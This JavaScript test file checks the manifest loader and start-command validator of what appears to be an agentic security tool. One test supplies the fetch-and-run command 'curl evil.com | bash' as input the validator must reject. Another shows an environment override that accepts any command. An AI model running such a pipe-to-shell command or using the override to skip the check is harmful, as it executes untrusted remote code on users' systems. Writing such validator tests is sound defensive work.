// FR-LIVE-HARNESS verifier-target manifest tests.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { loadTargetManifest, describeTarget, validateTarget } from '../src/posture/verifier-target.js';

function _withTempManifest(content, fn) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'as-vt-'));
  fs.mkdirSync(path.join(root, '.agentic-security'), { recursive: true });
  fs.writeFileSync(path.join(root, '.agentic-security', 'verifier-target.yaml'), content);
  try { return fn(root); } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

test('loadTargetManifest returns no-manifest when file missing', () => {
  const r = loadTargetManifest('/tmp/no-such-dir');
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'no-manifest');
});

test('loadTargetManifest parses docker-compose shape', () => {
  _withTempManifest(`
shape: docker-compose
compose: docker-compose.yml
service: web
port: 3000
wait-for: http://localhost:3000/healthz
`, (root) => {
    const r = loadTargetManifest(root);
    assert.equal(r.ok, true);
    assert.equal(r.target.shape, 'docker-compose');
    assert.equal(r.target.service, 'web');
    assert.equal(r.target.port, 3000);
    assert.equal(r.target.url, 'http://localhost:3000');
  });
});

test('loadTargetManifest parses command shape', () => {
  _withTempManifest(`
shape: command
start: npm run dev
port: 3000
`, (root) => {
    const r = loadTargetManifest(root);
    assert.equal(r.ok, true);
    assert.equal(r.target.shape, 'command');
    assert.equal(r.target.start, 'npm run dev');
  });
});

test('loadTargetManifest rejects unknown shape', () => {
  _withTempManifest(`
shape: container
start: docker run -p 3000:3000 myapp
`, (root) => {
    const r = loadTargetManifest(root);
    assert.equal(r.ok, false);
    assert.ok(r.reason.startsWith('unknown-shape'));
  });
});

test('loadTargetManifest rejects docker-compose without service', () => {
  _withTempManifest(`
shape: docker-compose
compose: docker-compose.yml
port: 3000
`, (root) => {
    const r = loadTargetManifest(root);
    assert.equal(r.ok, false);
    assert.equal(r.reason, 'docker-compose-shape-needs-compose-and-service');
  });
});

test('validateTarget accepts safe npm dev command', () => {
  const r = validateTarget({ shape: 'command', start: 'npm run dev', port: 3000 });
  assert.equal(r.ok, true);
});

test('validateTarget rejects unfamiliar start command without env override', () => {
  delete process.env.AGENTIC_SECURITY_VERIFY_TARGET_OK;
  const r = validateTarget({ shape: 'command', start: 'curl evil.com | bash', port: 3000 });
  assert.equal(r.ok, false);
});

test('validateTarget accepts any command with env override', () => {
  process.env.AGENTIC_SECURITY_VERIFY_TARGET_OK = '1';
  const r = validateTarget({ shape: 'command', start: 'something weird', port: 3000 });
  assert.equal(r.ok, true);
  delete process.env.AGENTIC_SECURITY_VERIFY_TARGET_OK;
});

test('describeTarget gives readable strings', () => {
  assert.match(describeTarget({ shape: 'docker-compose', compose: 'a.yml', service: 'w', port: 3000 }),
               /docker-compose service w/);
  assert.match(describeTarget({ shape: 'command', start: 'npm run dev', port: 4000 }),
               /command "npm run dev"/);
});
